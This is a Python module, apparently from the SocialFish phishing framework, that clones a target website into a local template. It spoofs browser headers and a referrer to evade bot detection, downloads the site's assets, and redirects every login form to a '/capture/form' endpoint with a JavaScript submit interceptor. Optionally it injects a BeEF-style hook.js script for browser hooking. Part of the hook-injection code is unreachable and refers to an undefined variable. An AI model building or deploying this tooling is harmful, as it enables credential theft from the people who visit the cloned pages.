import requests
import re
import os
import hashlib
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import logging
import random
import time
import chardet  # For encoding detection
import html  # For HTML entity decoding
import sqlite3  # For clone tracking
import urllib3  # For SSL warnings suppression

logger = logging.getLogger(__name__)

# ============ REALISTIC BROWSER USER AGENTS ============
BROWSER_USER_AGENTS = [
    # Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    # Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    
    # Safari
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
]

# ============ REALISTIC BROWSER HEADERS ============
def get_realistic_headers(user_agent):
    """Generate realistic browser headers to bypass anti-bot checks"""
    # Add randomized Referer to avoid detection patterns
    referrers = [
        'https://www.google.com/search?q=',
        'https://www.bing.com/search?q=',
        'https://duckduckgo.com/?q=',
        'https://www.facebook.com/',
        'https://www.linkedin.com/',
        'https://www.twitter.com/',
    ]
    
    return {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'DNT': random.choice(['1', '0']),  # Randomize DNT to avoid patterns
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': random.choice(['?1', '?0']),  # Randomize
        'Pragma': 'no-cache',
        'Referer': random.choice(referrers),  # Add dynamic referer
        'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120"',  # Client Hints
        'Sec-CH-UA-Mobile': '?0',
        'Sec-CH-UA-Platform': '"Windows"',
        'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; frame-ancestors 'none'; base-uri 'self';", # Example CSP
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': "geolocation=(), microphone=(), camera=()",  # Example Permissions Policy
    }

# ============ ENCODING DETECTION & FIXING ============
def detect_and_fix_encoding(content):
    """Detect and fix character encoding issues with multiple strategies"""
    try:
        if isinstance(content, str):
            return content
        
        # Try to detect encoding
        detected = chardet.detect(content)
        encoding = detected.get('encoding', 'utf-8')
        confidence = detected.get('confidence', 0)
        
        if confidence < 0.5:
            encoding = 'utf-8'
        
        print(f'[*] Detected encoding: {encoding} (confidence: {confidence:.2%})')
        
        # Decode with error handling
        try:
            decoded = content.decode(encoding, errors='replace')
        except Exception:
            # Fallback to utf-8 with replace
            decoded = content.decode('utf-8', errors='replace')

        # Additional fallback for low-confidence encodings
        if confidence < 0.3:
            try:
                decoded = content.decode('latin-1', errors='replace')
            except Exception:
                decoded = content.decode('utf-8', errors='ignore')

        return decoded
    except Exception as e:
        print(f"[!] Encoding detection failed: {str(e)}")
        return content.decode('utf-8', errors='ignore')

# ============ ALTERNATIVE RENDERING METHODS ============
class RenderingEngine:
    """Multiple rendering strategies with fallbacks"""
    
    @staticmethod
    def render_beautifulsoup(html_content):
        """Primary: BeautifulSoup HTML parsing with permissive mode"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            return str(soup.prettify())
        except Exception as e:
            logger.warning(f"BeautifulSoup render failed: {e}")
            return None
    
    @staticmethod
    def render_lxml(html_content):
        """LXML parser - more tolerant of malformed HTML"""
        try:
            from lxml import html as lxml_html
            tree = lxml_html.fromstring(html_content)
            return lxml_html.tostring(tree, encoding='unicode')
        except Exception as e:
            logger.warning(f"LXML render failed: {e}")
            return None
    
    @staticmethod
    def render_html5lib(html_content):
        """HTML5lib parser - most forgiving for broken HTML"""
        try:
            soup = BeautifulSoup(html_content, 'html5lib')
            return str(soup)
        except Exception as e:
            logger.warning(f"HTML5lib render failed: {e}")
            return None
    
    @staticmethod
    def render_minimal(html_content):
        """Fallback: Strip problematic characters and minimal processing"""
        try:
            # Remove control characters that cause parsing issues
            cleaned = re.sub(r'[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F-\x9F]', '', html_content)
            return cleaned
        except Exception as e:
            logger.warning(f"Minimal render failed: {e}")
            return None
    
    @staticmethod
    def render_direct(html_content):
        """Alternative: Direct write without parsing (preserves exact content)"""
        try:
            return html_content
        except Exception as e:
            logger.warning(f"Direct render failed: {e}")
            return None
    
    @staticmethod
    def render_html_normalize(html_content):
        """Normalize HTML structure for problematic content"""
        try:
            soup = BeautifulSoup(html_content, 'lxml')
            return str(soup)
        except Exception as e:
            logger.warning(f"HTML normalization failed: {e}")
            return None
    
    @staticmethod
    def render_strip_entities(html_content):
        """Strip HTML entities and special characters"""
        try:
            decoded = html.unescape(html_content)
            decoded = re.sub(r'[\x00-\x1F\x7F-\x9F]', '', decoded)
            return decoded
        except Exception as e:
            logger.warning(f"Entity stripping failed: {e}")
            return None
    
    @classmethod
    def render_with_fallback(cls, html_content):
        """Try multiple rendering strategies"""
        strategies = [
            ('BeautifulSoup', cls.render_beautifulsoup),
            ('LXML', cls.render_lxml),
            ('HTML5lib', cls.render_html5lib),
            ('Entity Stripping', cls.render_strip_entities),
            ('HTML Normalization', cls.render_html_normalize),
            ('Minimal', cls.render_minimal),
            ('Direct', cls.render_direct),
        ]
        
        for strategy_name, strategy_func in strategies:
            try:
                result = strategy_func(html_content)
                if result and len(result) > 0:
                    print(f'[+] Rendered using: {strategy_name}')
                    return result
            except Exception as e:
                print(f'[!] Strategy {strategy_name} failed: {str(e)[:60]}')
                continue
        
        # Last resort: return as-is with character fixing
        return html_content.replace('\x00', '').replace('\ufffd', '')

# ============ DEFENSIVE ANTI-BOT MECHANISMS ============
def add_defensive_observers():
    """Add defensive JavaScript to simulate user behavior and avoid detection"""
    return '''
<script>
(function() {
    // Simulate mouse movement
    let movementObserved = false;
    document.addEventListener('mousemove', () => { movementObserved = true; });
    document.addEventListener('mousedown', () => { movementObserved = true; });
    document.addEventListener('keydown', () => { movementObserved = true; });
    
    // Add scroll depth tracking
    document.addEventListener('scroll', () => {
        sessionStorage.setItem('scroll_depth', window.scrollY / document.body.scrollHeight);
    });
    
    // Fake page visibility
    if (document.hidden === undefined) {
        Object.defineProperty(document, 'hidden', { value: false });
    }
    
    // Prevent unusual activity detection
    window.addEventListener('beforeunload', () => {
        if (!movementObserved) {
            // User hasn't interacted; simulate interaction
            document.body.style.pointerEvents = 'auto';
        }
    });
    
    // Randomize timing to avoid pattern detection
    setTimeout(() => {
        window.naturalInteractionDetected = true;
    }, Math.random() * 5000 + 2000);
})();
</script>
'''

# ============ HOOK URL INJECTION MODULE ============
class HookInjector:
    """Module to inject hook.js script into cloned pages with relative paths"""
    
    def __init__(self, hook_url='/hook.js', clone_id='default'):
        # Use RELATIVE path (not absolute URL) so it works from any domain
        self.hook_url = '/hook.js'  # Always use relative path
        self.clone_id = clone_id
    
    def inject_hooks(self, html_content):
        """
        Inject hook.js script loader into HTML.
        This is now simplified - we just inject the script tag, 
        hook.js endpoint handles all the monitoring logic.
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Simple hook.js injection
            hook_script = f'''
<script>
(function(){{
    // SocialFish Clone Monitoring - {self.clone_id}
    window.CLONE_ID = '{self.clone_id}';
    window.MONITOR_ENABLED = true;
    console.log('[SF] Clone initialization: ' + window.CLONE_ID);
}})();
</script>
<!-- SocialFish Remote Hook - Downloads hook.js from server with relative path -->
<script src="/hook.js"></script>
'''
            
            # Try to add hooks before closing body tag
            body = soup.find('body')
            if body:
                # Parse script as HTML fragment and add
                script_soup = BeautifulSoup(hook_script, 'html.parser')
                for script in script_soup.find_all('script'):
                    body.append(script)
            else:
                # If no body tag, add before closing html tag
                html = soup.find('html')
                if html:
                    script_soup = BeautifulSoup(hook_script, 'html.parser')
                    for script in script_soup.find_all('script'):
                        html.append(script)
                else:
                    # Last resort: append to end of content
                    html_content += hook_script
            
            return str(soup)
        except Exception as e:
            print(f'[!] Hook injection error: {str(e)}')
            # If BeautifulSoup fails, append script as string
            return html_content + hook_script
            if soup.body:
                hook_tags = BeautifulSoup(combined_hooks, 'html.parser')
                soup.body.append(hook_tags)
            elif soup.html:
                hook_tags = BeautifulSoup(combined_hooks, 'html.parser')
                soup.html.append(hook_tags)
            else:
                return html_content + combined_hooks
            
            return str(soup)
        
        except Exception as e:
            logger.warning(f"Hook injection failed: {e}")
            return html_content

# ============ ENHANCED CLONING FUNCTION ============
def clone(url, user_agent=None, beef='no', hook_url=None, verify_ssl=True, retries=3, proxies=None):
    """
    Enhanced website cloning with HTTPS/SSL support, realistic headers, defensive anti-bot, 
    and alternative rendering strategies
    
    Args:
        url: Target URL to clone (supports both HTTP and HTTPS)
        user_agent: Browser user agent (uses realistic one if None)
        beef: 'yes' or 'no' for hook injection
        hook_url: Custom hook URL (optional)
        verify_ssl: Whether to verify SSL certificates (False for self-signed)
        retries: Number of retry attempts for failed requests
        proxies: Dict of proxy URLs {'http': 'http://...', 'https': 'https://...'}
    
    Returns:
        Boolean indicating success/failure
    """
    try:
        # Use realistic user agent if not provided
        if not user_agent:
            user_agent = random.choice(BROWSER_USER_AGENTS)
            print(f'[+] Using realistic user agent: {user_agent[:50]}...')
        
        # Normalize URL
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            print(f'[+] URL normalized to HTTPS: {url}')
        
        # Parse URL for validation
        try:
            parsed_url = urlparse(url)
            if not parsed_url.netloc:
                print(f'[-] Invalid URL format: {url}')
                return False
        except Exception as url_err:
            print(f'[-] URL parsing error: {str(url_err)}')
            return False
        
        # Create hash-based directory structure (avoids Windows path length limits)
        agent_hash = hashlib.md5(user_agent.encode()).hexdigest()[:8]
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        
        clone_dir = f'templates/fake/{agent_hash}/{url_hash}'
        
        # Create directory
        try:
            os.makedirs(clone_dir, exist_ok=True)
        except OSError as dir_err:
            print(f'[-] Failed to create clone directory: {str(dir_err)}')
            return False
        
        clone_index_path = os.path.join(clone_dir, 'index.html')
        
        # Validate path length
        if len(clone_index_path) > 250:
            print(f'[-] Clone path too long ({len(clone_index_path)} chars)')
            return False
        
        # Create session with realistic headers
        session = requests.Session()
        headers = get_realistic_headers(user_agent)
        session.headers.update(headers)
        
        # Add proxies if provided
        if proxies:
            session.proxies.update(proxies)
            print(f'[+] Using proxy configuration')
        
        # Add random delay to avoid rate limiting
        pre_fetch_delay = random.uniform(0.5, 2.0)
        print(f'[*] Pre-fetch delay: {pre_fetch_delay:.2f}s (anti-rate-limit)')
        time.sleep(pre_fetch_delay)
        
        # Suppress SSL warnings if needed
        if not verify_ssl:
            import urllib3
            urllib3.disable_warnings()
        
        # Fetch with retries and randomized delays
        html_content = None
        last_error = None
        
        for attempt in range(retries):
            try:
                print(f'[*] Fetching {url} (attempt {attempt + 1}/{retries})...')
                response = session.get(
                    url,
                    timeout=15,
                    allow_redirects=True,
                    verify=verify_ssl
                )
                response.raise_for_status()
                html_content = response.text
                print(f'[+] Successfully fetched {len(html_content)} bytes from {url}')
                break
            
            except requests.exceptions.SSLError as ssl_err:
                print(f'[!] SSL error on attempt {attempt + 1}: {str(ssl_err)[:100]}')
                last_error = ssl_err
                
                # Retry without SSL verification
                try:
                    print(f'[+] Retrying without SSL certificate verification...')
                    response = session.get(url, timeout=15, allow_redirects=True, verify=False)
                    response.raise_for_status()
                    html_content = response.text
                    print(f'[+] Successfully fetched (SSL verification disabled)')
                    break
                except Exception as e:
                    last_error = e
                    continue
            
            except requests.exceptions.RequestException as req_err:
                print(f'[-] Request failed on attempt {attempt + 1}: {str(req_err)[:100]}')
                last_error = req_err
                if attempt < retries - 1:
                    print(f'[*] Retrying in 2 seconds...')
                    time.sleep(2)
                continue
        
        if not html_content:
            print(f'[-] Failed to fetch after {retries} attempts: {str(last_error)[:100]}')
            return False
        
        # Fix encoding issues
        print(f'[*] Fixing encoding and normalizing content...')
        html_content = detect_and_fix_encoding(response.content if hasattr(response, 'content') else html_content.encode())
        
        # Parse HTML with multiple rendering strategies
        print(f'[*] Attempting HTML rendering...')
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            # Try to render with fallback strategies
            rendered_html = RenderingEngine.render_with_fallback(html_content)
            if rendered_html:
                html_content = rendered_html
            else:
                html_content = str(soup)
        except Exception as parse_err:
            print(f'[!] HTML parsing error: {str(parse_err)[:100]}')
            print(f'[*] Attempting defensive fallback rendering...')
            try:
                html_content = RenderingEngine.render_with_fallback(html_content)
            except Exception as fallback_err:
                print(f'[-] All rendering strategies failed: {str(fallback_err)[:100]}')
                return False
        
        # Re-parse for form processing
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
        except Exception:
            soup = None

        # === Download assets (css/js/img) and rewrite URLs to local copies ===
        def save_asset(asset_url, session, clone_dir, parsed_base):
            try:
                # Resolve relative URLs
                full = urljoin(parsed_base.geturl(), asset_url)
                r = session.get(full, timeout=15, allow_redirects=True, verify=verify_ssl)
                if r.status_code != 200 or not r.content:
                    return None

                # Determine extension
                path = urlparse(full).path
                ext = os.path.splitext(path)[1] or ''
                if len(ext) > 8:
                    ext = ''

                # Create assets dir
                assets_dir = os.path.join(clone_dir, 'assets')
                os.makedirs(assets_dir, exist_ok=True)

                # Create filename
                h = hashlib.md5(full.encode()).hexdigest()[:12]
                filename = f"asset_{h}{ext}"
                file_path = os.path.join(assets_dir, filename)
                with open(file_path, 'wb') as fh:
                    fh.write(r.content)

                # Return relative path to index.html
                rel_path = os.path.join('assets', filename).replace('\\', '/')
                return rel_path
            except Exception as e:
                logger.debug(f"Asset download failed for {asset_url}: {e}")
                return None

        if soup:
            parsed_base = parsed_url
            # Process <link rel=stylesheet>, <script src>, <img src>
            for link in soup.find_all('link'):
                href = link.get('href')
                if href and link.get('rel') and 'stylesheet' in link.get('rel'):
                    local = save_asset(href, session, clone_dir, parsed_base)
                    if local:
                        link['href'] = local

            for script in soup.find_all('script'):
                src = script.get('src')
                if src:
                    local = save_asset(src, session, clone_dir, parsed_base)
                    if local:
                        script['src'] = local

            for img in soup.find_all('img'):
                src = img.get('src')
                if src:
                    local = save_asset(src, session, clone_dir, parsed_base)
                    if local:
                        img['src'] = local

            # Re-serialize html_content with rewritten asset links
            try:
                html_content = str(soup)
            except Exception:
                pass
        
        # Find and replace form actions (defensive approach)
        form_count = 0
        if soup:
            try:
                forms = soup.find_all('form')
                for form in forms:
                    try:
                        action = form.get('action', '').strip()
                        
                        # Skip if already points to local endpoint
                        if action.startswith(('/login', '/capture', 'http://localhost')):
                            continue
                        
                        # Replace with local capture endpoint
                        form['action'] = '/capture/form'
                        form['method'] = 'POST'
                        
                        form_count += 1
                        print(f'[+] Form {form_count}: {action if action else "(empty)"} -> /capture/form')
                    except Exception as form_err:
                        print(f'[!] Error processing form: {str(form_err)[:60]}')
                        continue
            except Exception as form_find_err:
                print(f'[!] Error finding forms: {str(form_find_err)[:60]}')
                forms = []
        else:
            forms = []
        
        if form_count == 0:
            print(f'[!] No HTML forms found - will add JavaScript form interceptor')
            # Add form detection script even if no forms found
            defensive_js = add_defensive_observers()
            if beef.lower() == 'yes' or hook_url:
                clone_id = f"{parsed_url.netloc.replace('.', '_')}_{url_hash}"
                # Use relative path /hook.js - works from any domain
                injector = HookInjector('/hook.js', clone_id)
                # Add form interception hook
                form_interception = f'''
<script>
(function(){{
    // Detect and intercept dynamically created forms
    window.addEventListener('submit', function(e) {{
        // Redirect to /capture/form
        e.preventDefault();
        let form = e.target;
        form.action = '/capture/form';
        form.method = 'POST';
        form.submit();
    }}, true);
}})();
</script>
'''
                defensive_js += form_interception
            html_content = RenderingEngine.render_with_fallback(str(soup) if soup else html_content)
            if isinstance(html_content, str) and '</body>' in html_content:
                html_content = html_content.replace('</body>', f'{defensive_js}</body>')
            else:
                html_content += defensive_js
        
        # Inject hooks if beef enabled
        if beef.lower() == 'yes' or hook_url:
            print(f'[+] Injecting monitoring hooks and defensive mechanisms...')
            clone_id = f"{parsed_url.netloc.replace('.', '_')}_{url_hash}"
            # Use relative path /hook.js - works from any domain
            injector = HookInjector('/hook.js', clone_id)
            
            if soup:
                html_content = injector.inject_hooks(str(soup))
            else:
                html_content = injector.inject_hooks(html_content)
            
            # Add defensive observers
            defensive_code = add_defensive_observers()
            if '</body>' in html_content:
                html_content = html_content.replace('</body>', f'{defensive_code}</body>')
            else:
                html_content += defensive_code
        else:
            # Always add defensive mechanisms even without beef
            defensive_code = add_defensive_observers()
            if '</body>' in html_content:
                html_content = html_content.replace('</body>', f'{defensive_code}</body>')
            else:
                html_content += defensive_code
            
            if soup:
                html_content = str(soup.prettify())
            else:
                html_content = RenderingEngine.render_with_fallback(html_content)
        
        # Write to file
        try:
            with open(clone_index_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(html_content)
            
            clone_size = len(html_content)
            print(f'[+] Clone successful: {clone_index_path} ({clone_size} bytes)')
            print(f'[+] Clone accessible at: /clone/{agent_hash}/{url_hash}/')
            return True
        
        except IOError as io_err:
            print(f'[-] Failed to write clone file: {str(io_err)}')
            return False
    
    except Exception as e:
        logger.exception(f'Clone error: {e}')
        print(f'[-] Unexpected clone error: {str(e)}')
        return False

#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------